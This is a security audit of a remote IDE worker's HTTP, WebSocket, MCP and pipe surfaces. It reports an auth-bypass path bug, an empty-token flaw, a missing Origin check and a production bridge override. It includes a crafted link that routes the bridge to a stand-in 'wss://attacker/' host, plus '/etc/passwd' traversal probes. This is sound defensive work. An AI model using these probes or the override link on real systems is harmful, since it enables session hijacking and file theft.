# Remote-session security audit

An audit of every network- and IPC-reachable surface a remote session exposes, hunting for endpoints that
skip the auth gate, path confinement that can be escaped, and credential leakage. Findings are ordered by
severity. Each was verified against a real `Weavie.Headless --remote` worker, not read off the spec.

## Surfaces audited

| Surface | Reachability | Gate |
| --- | --- | --- |
| Worker HTTP (`/`, `/index.html`, `/weavie-media`, `/weavie-bridge`, `/control/*`, static assets) | network in remote mode | one default-deny middleware, `?token=` |
| Runner control plane (`/`, `/backend`) | network in secured modes | one default-deny middleware, `?token=` or `Authorization: Bearer` |
| IDE-MCP + registry-MCP (WebSocket + `POST /mcp`) | `127.0.0.1` only, hardcoded | per-session token, `FixedTimeEquals` |
| Hook bridge | named pipe / Unix socket | `PipeOptions.CurrentUserOnly` |
| LSP | rides the authed web bridge; no socket of its own | inherits the bridge |
| Web-bridge message dispatch (~60 message types) | via the authed bridge | path confinement + slot routing |

## Findings

### 1. `//index.html` served the document without a token — FIXED

**Severity: low — a correctness bug, not a vulnerability.** No secret is disclosed and no capability is
gained; see the impact assessment below. It is recorded here because it defeated a deliberate control, not
because it was exploitable.

`WorkspaceHttpServer` excludes `/` and `/index.html` from the public-asset allowlist so the document is only
ever served token-gated with the injected bootstrap. The exclusion tested the raw `PathString`, while the
existence check used `PhysicalFileProvider.GetFileInfo`, which strips leading separators. `//index.html`
therefore satisfied "not the index" *and* "is a real file", so the gate treated it as an anonymous static
asset and `UseStaticFiles` served the app shell.

Verified against a live worker before the fix:

```
/index.html    -> 401
//index.html   -> 200  <!doctype html><head></head><body>APP SH
```

**Impact: effectively none.** The served document is the *unmodified* shell — a splash screen and a script
tag. It carries no token and no bootstrap, and every asset it references is already served publicly by the
allowlist by design, so nothing secret is disclosed. An attacker cannot inject script through it; the only
lever is finding 4's `?weavie-bridge=` override changing which backend the real app talks to, which is a
phishing nicety (the URL bar shows the genuine worker host) rather than a compromise. The app the shell
boots has no token, so it can reach nothing on the worker. The remote-agent registry lives host-side in
`~/.weavie/remote-agents.json` rather than `localStorage`, so there is no ambient credential to steal
either.

What *was* real is the functional half: an **authenticated** `//index.html` also fell through to the static
middleware and returned the un-bootstrapped shell, i.e. a silently broken app for anyone hitting that URL.

**Fix (applied):** one `NormalizeSubpath` shared by the auth allowlist and the document route, so both decide
on the same string the file provider resolves. Worth doing less for the disclosure than for the pattern: the
allowlist is the single deliberate hole in an otherwise default-deny gate, and it was making one security
decision from two disagreeing notions of "the request path." That is cheap to remove now and expensive if the
allowlist ever guards something that matters.

### 2. An empty token opened every route — FIXED

**Severity: medium** (latent; nothing constructs it today).

`TokenMatches` compares presented and expected by length then content, so an empty expected token compares
equal to an absent one and authorizes every request. The "a token always exists" invariant was enforced in
`ListenMode.Resolve` and `WorkspaceHttpServerOptions.Loopback` — both far from the gate. Any future caller
constructing the options record directly would have silently published an unauthenticated workspace.

**Fix (applied):** `WorkspaceHttpServerOptions.Token` rejects an empty value at construction, making an
unauthenticated server unrepresentable rather than merely unreached.

### 3. The worker gate ignores `Authorization: Bearer`

**Severity: low** (fails closed; hardening).

`remote-sessions.md` states the token is presented "via `Authorization: Bearer` or `?token=`". The runner
honours both (`ControlApi.Authorized`); the worker reads only the query string (`TokenMatches`). Verified:

```
curl -H 'Authorization: Bearer <correct>' http://worker/   -> 401
curl 'http://worker/?token=<correct>'                      -> 200
```

Nothing is exploitable — it refuses a valid credential rather than accepting an invalid one — but it is why
the worker token is pinned into every URL, which is the root of the deferred "token in URL" debt (browser
history, proxy logs, `Referer` on any policy-less response).

**Suggested fix:** extract the runner's two-source token reader into one shared gate used by both hosts. That
removes a duplicated security primitive (two hand-rolled constant-time comparisons exist today) and lets the
page hold the token in memory instead of the address bar.

### 4. `?weavie-bridge=` is a production-reachable bridge override

**Severity: low today — but it is an escalation primitive worth removing before the token moves to a cookie.**

`resolveBridgeEndpoint()` in `src/web/src/bridge.ts` lets a `?weavie-bridge=` query parameter override the
bridge URL, and it *wins* over the host-injected `window.__WEAVIE_BRIDGE_WS__`. It is documented in
`headless-host.md` as "handy for manual testing" but carries no `import.meta.env.DEV` guard, so it ships in
release builds. A page loaded as `…/index.html?token=T&weavie-bridge=wss://attacker/` routes the entire
bridge — `fs-write` payloads, `term-input` keystrokes, every push — to an attacker-controlled socket.

**Why it is not exploitable today.** Reaching that code requires loading the workspace document, and there is
no unauthenticated path to it: `__WEAVIE_BRIDGE_WS__` is injected only by the token-gated `ServeIndexAsync`,
and every native host navigates to the token-gated `WorkspacePageUrl`. An attacker who can load the document
already holds the worker token, which already grants total control of the box (`term-input` is arbitrary
shell). The override escalates nothing.

**Why it is still worth removing.** Two reasons, neither urgent. It is the pattern AGENTS.md prohibits under
"no buried debug flags" — an instrumentation toggle that is neither a real setting nor off by default. And it
is a latent escalation primitive: the deferred hardening step of moving the document token from the URL to a
cookie makes page URLs shareable, at which point a crafted link turns this into real session MITM. Removing
it *before* that lands is the cheap ordering.

**Suggested fix — note it is not a flag flip.** Gating the override behind `import.meta.env.DEV` breaks the
e2e suite, which drives every page load through this parameter (`mock-host.ts` builds its page URLs as
`?weavie-bridge=<mock>`). The harness must first inject `__WEAVIE_BRIDGE_WS__` in its stand-in bootstrap
instead — which is where it already builds one. Treat this as a test-harness change, not a one-line guard.

### 5. No `Origin` check on the bridge WebSocket, and a test that claims otherwise

**Severity: low** (currently covered by the token).

There is no origin validation anywhere in `WorkspaceHttpServer`. `HeadlessAuthTests` asserts a foreign origin
is rejected in local mode and comments that "the same-origin (CSWSH) check applies to the local no-token mode
only" — but there is no no-token mode (loopback mints a 256-bit token) and no such check. That test passes
because it omits the token, not because of a CSWSH guard, so it would not catch the guard's removal.

The token genuinely covers this today: WebSocket connections cannot carry custom headers cross-origin, and
the token is not an ambient cookie. The risk is that the comment describes a control that does not exist, so
a future change that moves the token to a cookie (an explicitly deferred hardening step) would silently
introduce a CSWSH hole.

**Suggested fix:** correct the test's comment to state that the token alone is the gate, and add the origin
check as a precondition on the "token to a cookie" work rather than after it.

## Surfaces confirmed sound

These were examined for the same class of defect and hold up:

- **Fail-closed startup.** `ListenMode.Resolve` makes an exposed-but-unauthenticated host unrepresentable:
  a network bind is reachable only through `--remote`, which mandates a token, and all three contradictory
  flag combinations exit non-zero.
- **Gate ordering.** Both default-deny middlewares are registered before any endpoint mapping, so a newly
  added route is gated by construction. Confirmed no `Map*` call precedes either gate.
- **Path confinement.** `fs-read`/`fs-write`/`fs-stat`, `list-dir`, `reveal-file`, MCP `openFile` and
  `/weavie-media` all funnel through `PathBoundary.Contains` + `WorkspaceFileScope`. Traversal probes against
  the live media route (`/etc/passwd`, `../../../../etc/passwd`) return 404, and the route additionally
  requires a passive `image/*` or `video/*` content type with `image/svg+xml` explicitly excluded — so it
  cannot be used to serve script from the worker origin.
- **MCP.** Both servers bind `IPAddress.Loopback` unconditionally (not affected by `--bind`) and authenticate
  the WebSocket upgrade *and* the plain-HTTP `POST /mcp` path, using `CryptographicOperations.FixedTimeEquals`.
- **Hook bridge.** `PipeOptions.CurrentUserOnly` on both server and client, so the Unix socket is owner-only
  rather than the world-writable `/tmp` default.
- **Slot routing.** `SessionForSlot` fails closed: an unresolvable named slot is rejected and logged; only a
  genuinely absent slot falls back to the active session.
- **`open-url`.** Gated to absolute http/https at the Core boundary before reaching any OS opener; the Linux
  opener uses `ArgumentList` with `UseShellExecute = false`. The WebView new-window and navigation handlers
  re-check the scheme, so no call site reaches `ShellExecute` ungated. (The check is duplicated across three
  call sites — worth collapsing, but all three are correct.)
- **Auto-update.** Bundles are SHA-256 verified against the digest the release API reports before extraction.
  Note this is trust-on-GitHub, not an independent signature: it defends against a corrupted or MITM'd
  download, not against a compromised release. Worth an explicit signature if the threat model widens.
- **Cross-backend isolation.** The web honours a `remote-agents` push only from the local backend, so a remote
  runner cannot inject agents into the client's registry.
- **CORS `*` on the runner.** Safe as reasoned in the spec — auth is a bearer token, not an ambient cookie,
  so a malicious origin cannot forge a credentialed request.
